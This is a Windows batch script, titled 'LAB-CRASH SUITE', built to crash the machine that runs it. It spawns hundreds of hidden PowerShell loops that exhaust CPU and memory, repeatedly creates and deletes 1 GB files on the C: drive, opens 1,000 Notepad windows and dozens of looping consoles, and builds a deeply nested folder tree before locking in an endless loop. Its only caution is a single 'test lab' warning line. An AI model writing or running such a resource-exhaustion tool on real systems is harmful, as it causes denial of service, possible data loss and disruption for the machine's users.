@echo off
setlocal enabledelayedexpansion
title 0x0806 | LAB-CRASH SUITE
color 0C

:: CONFIG
set CPU_THREADS=200
set RAM_THREADS=100
set ZOMBIE_CONSOLES=80
set DISK_FLOODS=40
set FILE_SIZE=1000000000

:: ============================
echo [!] SYSTEM CRASH INITIATED
echo Do NOT use this outside test lab
timeout /t 5 >nul

:: === CPU OVERLOAD ===
for /L %%i in (1,1,%CPU_THREADS%) do (
    start "" powershell -WindowStyle Hidden -Command "$x=1; while ($true) { $x *= 999999 }"
)

:: === RAM OVERLOAD ===
for /L %%i in (1,1,%RAM_THREADS%) do (
    start "" powershell -WindowStyle Hidden -Command "$b='A'*1024*1024*500; while($true) { $b+=$b.Substring(0,10000) }"
)

:: === DISK LOCKS + NTFS JAMS ===
for /L %%i in (1,1,%DISK_FLOODS%) do (
    start "" cmd /c ":diskloop && fsutil file createnew C:\f%%i.tmp %FILE_SIZE% >nul && del C:\f%%i.tmp >nul && goto diskloop"
)

:: === MAX ZOMBIE CMD WINDOWS ===
for /L %%i in (1,1,%ZOMBIE_CONSOLES%) do (
    start "" cmd /k ":zombie && echo SYSTEM CRITICAL %%i && goto zombie"
)

:: === GPU DRIVER POLLING SPAM ===
for /L %%i in (1,1,30) do (
    start "" powershell -WindowStyle Hidden -Command "while ($true) { Get-WmiObject Win32_VideoController | Out-Null }"
)
start "" dxdiag /t %temp%\dxcrash.txt

:: === HANDLE & WINDOW OBJECT SPAM ===
for /L %%i in (1,1,1000) do (
    start "" notepad.exe
)

:: === FILESYSTEM TREE BOMB ===
set tpath=%temp%\treebomb
mkdir %tpath%
cd %tpath%
for /L %%i in (1,1,500) do (
    mkdir folder%%i
    cd folder%%i
    echo X > file%%i.txt
)

:: ENDLESS LOOP TO HOLD
:lock
goto lock
